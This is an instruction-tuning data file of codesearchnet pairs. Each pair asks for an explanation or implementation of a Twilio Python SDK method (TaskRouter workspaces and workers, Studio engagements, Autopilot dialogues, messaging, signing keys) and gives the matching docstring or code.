{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef request(self, method, uri, params=None, data=None, headers=None,\n                auth=None, timeout=None, allow_redirects=False):\n        \"\"\"\n        Makes an HTTP request to this domain.\n        :param string method: The HTTP method.\n        :param string uri: The HTTP uri.\n        :param dict params: Query parameters.\n        :param object data: The request body.\n        :param dict headers: The HTTP headers.\n        :param tuple auth: Basic auth tuple of (username, password)\n        :param int timeout: The request timeout.\n        :param bool allow_redirects: True if the client should follow HTTP\n        redirects.\n        \"\"\"\n        url = self.absolute_url(uri)\n        return self.twilio.request(\n            method,\n            url,\n            params=params,\n            data=data,\n            headers=headers,\n            auth=auth,\n            timeout=timeout,\n            allow_redirects=allow_redirects\n        )", "response": "Makes an HTTP request to this domain."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self, sid):\n        return EngagementContext(self._version, flow_sid=self._solution['flow_sid'], sid=sid, )", "response": "Constructs a EngagementContext\n\n        :param sid: Engagement Sid.\n\n        :returns: twilio.rest.studio.v1.flow.engagement.EngagementContext\n        :rtype: twilio.rest.studio.v1.flow.engagement.EngagementContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return EngagementInstance(self._version, payload, flow_sid=self._solution['flow_sid'], )", "response": "Build an instance of EngagementInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef steps(self):\n        if self._steps is None:\n            self._steps = StepList(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                engagement_sid=self._solution['sid'],\n            )\n        return self._steps", "response": "Access the steps\n\n        :returns: twilio.rest.studio.v1.flow.engagement.step.StepList\n        :rtype: twilio.rest.studio.v1.flow.engagement.step.StepList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\naccessing the engagement_context :returns: twilio.rest.studio.v1.flow.engagement.engagement_context.EngagementContextList :rtype: twilio.rest.studio.v1.flow.engagement.engagement_context.EngagementContextList", "response": "def engagement_context(self):\n        \"\"\"\n        Access the engagement_context\n\n        :returns: twilio.rest.studio.v1.flow.engagement.engagement_context.EngagementContextList\n        :rtype: twilio.rest.studio.v1.flow.engagement.engagement_context.EngagementContextList\n        \"\"\"\n        if self._engagement_context is None:\n            self._engagement_context = EngagementContextList(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                engagement_sid=self._solution['sid'],\n            )\n        return self._engagement_context"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate an instance context for the agagementInstance", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: EngagementContext for this EngagementInstance\n        :rtype: twilio.rest.studio.v1.flow.engagement.EngagementContext\n        \"\"\"\n        if self._context is None:\n            self._context = EngagementContext(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nconstruct a DialogueContext :param sid: The unique string that identifies the resource :returns: twilio.rest.autopilot.v1.assistant.dialogue.DialogueContext :rtype: twilio.rest.autopilot.v1.assistant.dialogue.DialogueContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a DialogueContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.autopilot.v1.assistant.dialogue.DialogueContext\n        :rtype: twilio.rest.autopilot.v1.assistant.dialogue.DialogueContext\n        \"\"\"\n        return DialogueContext(self._version, assistant_sid=self._solution['assistant_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding an instance of DialogueInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of DialogueInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.autopilot.v1.assistant.dialogue.DialogueInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.dialogue.DialogueInstance\n        \"\"\"\n        return DialogueInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: DialogueContext for this DialogueInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.dialogue.DialogueContext\n        \"\"\"\n        if self._context is None:\n            self._context = DialogueContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the MessagingList Twilio Domain", "response": "def messaging(self):\n        \"\"\"\n        :rtype: twilio.rest.pricing.v1.messaging.MessagingList\n        \"\"\"\n        if self._messaging is None:\n            self._messaging = MessagingList(self)\n        return self._messaging"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef voice(self):\n        if self._voice is None:\n            self._voice = VoiceList(self)\n        return self._voice", "response": "Access the VoiceList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create(self, code, to=values.unset, verification_sid=values.unset,\n               amount=values.unset, payee=values.unset):\n        \"\"\"\n        Create a new VerificationCheckInstance\n\n        :param unicode code: The verification string\n        :param unicode to: The phone number to verify\n        :param unicode verification_sid: A SID that uniquely identifies the Verification Check\n        :param unicode amount: The amount of the associated PSD2 compliant transaction.\n        :param unicode payee: The payee of the associated PSD2 compliant transaction\n\n        :returns: Newly created VerificationCheckInstance\n        :rtype: twilio.rest.verify.v2.service.verification_check.VerificationCheckInstance\n        \"\"\"\n        data = values.of({\n            'Code': code,\n            'To': to,\n            'VerificationSid': verification_sid,\n            'Amount': amount,\n            'Payee': payee,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return VerificationCheckInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new VerificationCheckInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a new WorkspaceInstance", "response": "def create(self, friendly_name, event_callback_url=values.unset,\n               events_filter=values.unset, multi_task_enabled=values.unset,\n               template=values.unset, prioritize_queue_order=values.unset):\n        \"\"\"\n        Create a new WorkspaceInstance\n\n        :param unicode friendly_name: Human readable description of this workspace\n        :param unicode event_callback_url: If provided, the Workspace will publish events to this URL.\n        :param unicode events_filter: Use this parameter to receive webhooks on EventCallbackUrl for specific events on a workspace.\n        :param bool multi_task_enabled: Multi tasking allows workers to handle multiple tasks simultaneously.\n        :param unicode template: One of the available template names.\n        :param WorkspaceInstance.QueueOrder prioritize_queue_order: Use this parameter to configure whether to prioritize LIFO or FIFO when workers are receiving Tasks from combination of LIFO and FIFO TaskQueues.\n\n        :returns: Newly created WorkspaceInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.WorkspaceInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'EventCallbackUrl': event_callback_url,\n            'EventsFilter': events_filter,\n            'MultiTaskEnabled': multi_task_enabled,\n            'Template': template,\n            'PrioritizeQueueOrder': prioritize_queue_order,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return WorkspaceInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the WorkspaceInstance :param unicode default_activity_sid: The ID of the Activity that will be used when new Workers are created in this Workspace. :param unicode event_callback_url: The Workspace will publish events to this URL. :param unicode events_filter: Use this parameter to receive webhooks on EventCallbackUrl for specific events on a workspace. :param unicode friendly_name: Human readable description of this workspace :param bool multi_task_enabled: Enable or Disable Multitasking by passing either true or False with the POST request. :param unicode timeout_activity_sid: The ID of the Activity that will be assigned to a Worker when a Task reservation times out without a response. :param WorkspaceInstance.QueueOrder prioritize_queue_order: Use this parameter to configure whether to prioritize LIFO or FIFO when workers are receiving Tasks from combination of LIFO and FIFO TaskQueues. :returns: Updated WorkspaceInstance :rtype: twilio.rest.taskrouter.v1.workspace.WorkspaceInstance", "response": "def update(self, default_activity_sid=values.unset,\n               event_callback_url=values.unset, events_filter=values.unset,\n               friendly_name=values.unset, multi_task_enabled=values.unset,\n               timeout_activity_sid=values.unset,\n               prioritize_queue_order=values.unset):\n        \"\"\"\n        Update the WorkspaceInstance\n\n        :param unicode default_activity_sid: The ID of the Activity that will be used when new Workers are created in this Workspace.\n        :param unicode event_callback_url: The Workspace will publish events to this URL.\n        :param unicode events_filter: Use this parameter to receive webhooks on EventCallbackUrl for specific events on a workspace.\n        :param unicode friendly_name: Human readable description of this workspace\n        :param bool multi_task_enabled: Enable or Disable Multitasking by passing either true or False with the POST request.\n        :param unicode timeout_activity_sid: The ID of the Activity that will be assigned to a Worker when a Task reservation times out without a response.\n        :param WorkspaceInstance.QueueOrder prioritize_queue_order: Use this parameter to configure whether to prioritize LIFO or FIFO when workers are receiving Tasks from combination of LIFO and FIFO TaskQueues.\n\n        :returns: Updated WorkspaceInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.WorkspaceInstance\n        \"\"\"\n        data = values.of({\n            'DefaultActivitySid': default_activity_sid,\n            'EventCallbackUrl': event_callback_url,\n            'EventsFilter': events_filter,\n            'FriendlyName': friendly_name,\n            'MultiTaskEnabled': multi_task_enabled,\n            'TimeoutActivitySid': timeout_activity_sid,\n            'PrioritizeQueueOrder': prioritize_queue_order,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return WorkspaceInstance(self._version, payload, sid=self._solution['sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef activities(self):\n        if self._activities is None:\n            self._activities = ActivityList(self._version, workspace_sid=self._solution['sid'], )\n        return self._activities", "response": "Access the activities\n\n        :returns: twilio.rest.taskrouter.v1.workspace.activity.ActivityList\n        :rtype: twilio.rest.taskrouter.v1.workspace.activity.ActivityList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef events(self):\n        if self._events is None:\n            self._events = EventList(self._version, workspace_sid=self._solution['sid'], )\n        return self._events", "response": "Access the events\n\n        :returns: twilio.rest.taskrouter.v1.workspace.event.EventList\n        :rtype: twilio.rest.taskrouter.v1.workspace.event.EventList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the tasks :returns: twilio.rest.taskrouter.v1.workspace.task.TaskList :rtype: twilio.rest.taskrouter.v1.workspace.task.TaskList", "response": "def tasks(self):\n        \"\"\"\n        Access the tasks\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task.TaskList\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.TaskList\n        \"\"\"\n        if self._tasks is None:\n            self._tasks = TaskList(self._version, workspace_sid=self._solution['sid'], )\n        return self._tasks"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the task_queues :returns: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueList :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueList", "response": "def task_queues(self):\n        \"\"\"\n        Access the task_queues\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueList\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.TaskQueueList\n        \"\"\"\n        if self._task_queues is None:\n            self._task_queues = TaskQueueList(self._version, workspace_sid=self._solution['sid'], )\n        return self._task_queues"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef workers(self):\n        if self._workers is None:\n            self._workers = WorkerList(self._version, workspace_sid=self._solution['sid'], )\n        return self._workers", "response": "Access the workers\n\n        :returns: twilio.rest.taskrouter.v1.workspace.worker.WorkerList\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.WorkerList"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef workflows(self):\n        if self._workflows is None:\n            self._workflows = WorkflowList(self._version, workspace_sid=self._solution['sid'], )\n        return self._workflows", "response": "Access the workflows\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workflow.WorkflowList\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.WorkflowList"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the statistics :returns: twilio.rest.taskrouter.v1.workspace.workspace_statistics.WorkspaceStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.workspace_statistics.WorkspaceStatisticsList", "response": "def statistics(self):\n        \"\"\"\n        Access the statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workspace_statistics.WorkspaceStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.workspace_statistics.WorkspaceStatisticsList\n        \"\"\"\n        if self._statistics is None:\n            self._statistics = WorkspaceStatisticsList(self._version, workspace_sid=self._solution['sid'], )\n        return self._statistics"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\naccess the real_time_statistics :returns: twilio.rest.taskrouter.v1.workspace.workspace_real_time_statistics.WorkspaceRealTimeStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.workspace_real_time_statistics.WorkspaceRealTimeStatisticsList", "response": "def real_time_statistics(self):\n        \"\"\"\n        Access the real_time_statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workspace_real_time_statistics.WorkspaceRealTimeStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.workspace_real_time_statistics.WorkspaceRealTimeStatisticsList\n        \"\"\"\n        if self._real_time_statistics is None:\n            self._real_time_statistics = WorkspaceRealTimeStatisticsList(\n                self._version,\n                workspace_sid=self._solution['sid'],\n            )\n        return self._real_time_statistics"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the cumulative_statistics :returns: twilio.rest.taskrouter.v1.workspace.workspace_cumulative_statistics.WorkspaceCumulativeStatisticsList :rtype: twilio.rest.taskrouter.v1.workspace.workspace_cumulative_statistics.WorkspaceCumulativeStatisticsList", "response": "def cumulative_statistics(self):\n        \"\"\"\n        Access the cumulative_statistics\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workspace_cumulative_statistics.WorkspaceCumulativeStatisticsList\n        :rtype: twilio.rest.taskrouter.v1.workspace.workspace_cumulative_statistics.WorkspaceCumulativeStatisticsList\n        \"\"\"\n        if self._cumulative_statistics is None:\n            self._cumulative_statistics = WorkspaceCumulativeStatisticsList(\n                self._version,\n                workspace_sid=self._solution['sid'],\n            )\n        return self._cumulative_statistics"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef task_channels(self):\n        if self._task_channels is None:\n            self._task_channels = TaskChannelList(self._version, workspace_sid=self._solution['sid'], )\n        return self._task_channels", "response": "Access the task_channels\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_channel.TaskChannelList\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_channel.TaskChannelList"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngenerating an instance context for the resource", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: WorkspaceContext for this WorkspaceInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.WorkspaceContext\n        \"\"\"\n        if self._context is None:\n            self._context = WorkspaceContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the WorkspaceInstance :param unicode default_activity_sid: The ID of the Activity that will be used when new Workers are created in this Workspace. :param unicode event_callback_url: The Workspace will publish events to this URL. :param unicode events_filter: Use this parameter to receive webhooks on EventCallbackUrl for specific events on a workspace. :param unicode friendly_name: Human readable description of this workspace :param bool multi_task_enabled: Enable or Disable Multitasking by passing either true or False with the POST request. :param unicode timeout_activity_sid: The ID of the Activity that will be assigned to a Worker when a Task reservation times out without a response. :param WorkspaceInstance.QueueOrder prioritize_queue_order: Use this parameter to configure whether to prioritize LIFO or FIFO when workers are receiving Tasks from combination of LIFO and FIFO TaskQueues. :returns: Updated WorkspaceInstance :rtype: twilio.rest.taskrouter.v1.workspace.WorkspaceInstance", "response": "def update(self, default_activity_sid=values.unset,\n               event_callback_url=values.unset, events_filter=values.unset,\n               friendly_name=values.unset, multi_task_enabled=values.unset,\n               timeout_activity_sid=values.unset,\n               prioritize_queue_order=values.unset):\n        \"\"\"\n        Update the WorkspaceInstance\n\n        :param unicode default_activity_sid: The ID of the Activity that will be used when new Workers are created in this Workspace.\n        :param unicode event_callback_url: The Workspace will publish events to this URL.\n        :param unicode events_filter: Use this parameter to receive webhooks on EventCallbackUrl for specific events on a workspace.\n        :param unicode friendly_name: Human readable description of this workspace\n        :param bool multi_task_enabled: Enable or Disable Multitasking by passing either true or False with the POST request.\n        :param unicode timeout_activity_sid: The ID of the Activity that will be assigned to a Worker when a Task reservation times out without a response.\n        :param WorkspaceInstance.QueueOrder prioritize_queue_order: Use this parameter to configure whether to prioritize LIFO or FIFO when workers are receiving Tasks from combination of LIFO and FIFO TaskQueues.\n\n        :returns: Updated WorkspaceInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.WorkspaceInstance\n        \"\"\"\n        return self._proxy.update(\n            default_activity_sid=default_activity_sid,\n            event_callback_url=event_callback_url,\n            events_filter=events_filter,\n            friendly_name=friendly_name,\n            multi_task_enabled=multi_task_enabled,\n            timeout_activity_sid=timeout_activity_sid,\n            prioritize_queue_order=prioritize_queue_order,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef flex_flow(self):\n        if self._flex_flow is None:\n            self._flex_flow = FlexFlowList(self)\n        return self._flex_flow", "response": "Access the FlexFlowList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef configuration(self):\n        if self._configuration is None:\n            self._configuration = ConfigurationList(self)\n        return self._configuration", "response": "Access the ConfigurationList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self, sid):\n        return SigningKeyContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )", "response": "Constructs a SigningKeyContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.api.v2010.account.signing_key.SigningKeyContext\n        :rtype: twilio.rest.api.v2010.account.signing_key.SigningKeyContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return SigningKeyInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of SigningKeyInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nupdate the SigningKeyInstance :param unicode friendly_name: The friendly_name :returns: Updated SigningKeyInstance :rtype: twilio.rest.api.v2010.account.signing_key.SigningKeyInstance", "response": "def update(self, friendly_name=values.unset):\n        \"\"\"\n        Update the SigningKeyInstance\n\n        :param unicode friendly_name: The friendly_name\n\n        :returns: Updated SigningKeyInstance\n        :rtype: twilio.rest.api.v2010.account.signing_key.SigningKeyInstance\n        \"\"\"\n        data = values.of({'FriendlyName': friendly_name, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SigningKeyInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: SigningKeyContext for this SigningKeyInstance\n        :rtype: twilio.rest.api.v2010.account.signing_key.SigningKeyContext\n        \"\"\"\n        if self._context is None:\n            self._context = SigningKeyContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds an instance of DayInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of DayInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.preview.bulk_exports.export.day.DayInstance\n        :rtype: twilio.rest.preview.bulk_exports.export.day.DayInstance\n        \"\"\"\n        return DayInstance(self._version, payload, resource_type=self._solution['resource_type'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds an instance of ThisMonthInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ThisMonthInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.usage.record.this_month.ThisMonthInstance\n        :rtype: twilio.rest.api.v2010.account.usage.record.this_month.ThisMonthInstance\n        \"\"\"\n        return ThisMonthInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, sid):\n        return MessageContext(self._version, session_sid=self._solution['session_sid'], sid=sid, )", "response": "Constructs a MessageContext\n\n        :param sid: A 34 character string that uniquely identifies this resource.\n\n        :returns: twilio.rest.messaging.v1.session.message.MessageContext\n        :rtype: twilio.rest.messaging.v1.session.message.MessageContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return MessageInstance(self._version, payload, session_sid=self._solution['session_sid'], )", "response": "Build an instance of MessageInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nupdates the MessageInstance :param unicode author: The identity of the message's author. :param unicode attributes: A string metadata field you can use to store any data you wish. :param datetime date_created: The date that this resource was created. :param datetime date_updated: The date that this resource was last updated. :param unicode body: The contents of the message. :returns: Updated MessageInstance :rtype: twilio.rest.messaging.v1.session.message.MessageInstance", "response": "def update(self, author=values.unset, attributes=values.unset,\n               date_created=values.unset, date_updated=values.unset,\n               body=values.unset):\n        \"\"\"\n        Update the MessageInstance\n\n        :param unicode author: The identity of the message's author.\n        :param unicode attributes: A string metadata field you can use to store any data you wish.\n        :param datetime date_created: The date that this resource was created.\n        :param datetime date_updated: The date that this resource was last updated.\n        :param unicode body: The contents of the message.\n\n        :returns: Updated MessageInstance\n        :rtype: twilio.rest.messaging.v1.session.message.MessageInstance\n        \"\"\"\n        data = values.of({\n            'Author': author,\n            'Attributes': attributes,\n            'DateCreated': serialize.iso8601_datetime(date_created),\n            'DateUpdated': serialize.iso8601_datetime(date_updated),\n            'Body': body,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return MessageInstance(\n            self._version,\n            payload,\n            session_sid=self._solution['session_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: MessageContext for this MessageInstance\n        :rtype: twilio.rest.messaging.v1.session.message.MessageContext\n        \"\"\"\n        if self._context is None:\n            self._context = MessageContext(\n                self._version,\n                session_sid=self._solution['session_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self, author=values.unset, attributes=values.unset,\n               date_created=values.unset, date_updated=values.unset,\n               body=values.unset):\n        \"\"\"\n        Update the MessageInstance\n\n        :param unicode author: The identity of the message's author.\n        :param unicode attributes: A string metadata field you can use to store any data you wish.\n        :param datetime date_created: The date that this resource was created.\n        :param datetime date_updated: The date that this resource was last updated.\n        :param unicode body: The contents of the message.\n\n        :returns: Updated MessageInstance\n        :rtype: twilio.rest.messaging.v1.session.message.MessageInstance\n        \"\"\"\n        return self._proxy.update(\n            author=author,\n            attributes=attributes,\n            date_created=date_created,\n            date_updated=date_updated,\n            body=body,\n        )", "response": "Update the MessageInstance s related metadata fields."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef stream(self, activity_name=values.unset, activity_sid=values.unset,\n               available=values.unset, friendly_name=values.unset,\n               target_workers_expression=values.unset, task_queue_name=values.unset,\n               task_queue_sid=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Streams WorkerInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode activity_name: Filter by workers that are in a particular Activity by Friendly Name\n        :param unicode activity_sid: Filter by workers that are in a particular Activity by SID\n        :param unicode available: Filter by workers that are available or unavailable.\n        :param unicode friendly_name: Filter by a worker's friendly name\n        :param unicode target_workers_expression: Filter by workers that would match an expression on a TaskQueue.\n        :param unicode task_queue_name: Filter by workers that are eligible for a TaskQueue by Friendly Name\n        :param unicode task_queue_sid: Filter by workers that are eligible for a TaskQueue by SID\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.taskrouter.v1.workspace.worker.WorkerInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            activity_name=activity_name,\n            activity_sid=activity_sid,\n            available=available,\n            friendly_name=friendly_name,\n            target_workers_expression=target_workers_expression,\n            task_queue_name=task_queue_name,\n            task_queue_sid=task_queue_sid,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])", "response": "Streams WorkerInstance records from the TaskRouter API as a generator. This operation lazily loads records as efficiently as possible until the limit is reached."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a list of WorkerInstance records from the TaskRouter API.", "response": "def list(self, activity_name=values.unset, activity_sid=values.unset,\n             available=values.unset, friendly_name=values.unset,\n             target_workers_expression=values.unset, task_queue_name=values.unset,\n             task_queue_sid=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists WorkerInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode activity_name: Filter by workers that are in a particular Activity by Friendly Name\n        :param unicode activity_sid: Filter by workers that are in a particular Activity by SID\n        :param unicode available: Filter by workers that are available or unavailable.\n        :param unicode friendly_name: Filter by a worker's friendly name\n        :param unicode target_workers_expression: Filter by workers that would match an expression on a TaskQueue.\n        :param unicode task_queue_name: Filter by workers that are eligible for a TaskQueue by Friendly Name\n        :param unicode task_queue_sid: Filter by workers that are eligible for a TaskQueue by SID\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.taskrouter.v1.workspace.worker.WorkerInstance]\n        \"\"\"\n        return list(self.stream(\n            activity_name=activity_name,\n            activity_sid=activity_sid,\n            available=available,\n            friendly_name=friendly_name,\n            target_workers_expression=target_workers_expression,\n            task_queue_name=task_queue_name,\n            task_queue_sid=task_queue_sid,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef page(self, activity_name=values.unset, activity_sid=values.unset,\n             available=values.unset, friendly_name=values.unset,\n             target_workers_expression=values.unset, task_queue_name=values.unset,\n             task_queue_sid=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of WorkerInstance records from the API.\n        Request is executed immediately\n\n        :param unicode activity_name: Filter by workers that are in a particular Activity by Friendly Name\n        :param unicode activity_sid: Filter by workers that are in a particular Activity by SID\n        :param unicode available: Filter by workers that are available or unavailable.\n        :param unicode friendly_name: Filter by a worker's friendly name\n        :param unicode target_workers_expression: Filter by workers that would match an expression on a TaskQueue.\n        :param unicode task_queue_name: Filter by workers that are eligible for a TaskQueue by Friendly Name\n        :param unicode task_queue_sid: Filter by workers that are eligible for a TaskQueue by SID\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of WorkerInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.WorkerPage\n        \"\"\"\n        params = values.of({\n            'ActivityName': activity_name,\n            'ActivitySid': activity_sid,\n            'Available': available,\n            'FriendlyName': friendly_name,\n            'TargetWorkersExpression': target_workers_expression,\n            'TaskQueueName': task_queue_name,\n            'TaskQueueSid': task_queue_sid,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return WorkerPage(self._version, response, self._solution)", "response": "Retrieve a single page of WorkerInstance records from the TaskRouter API."}
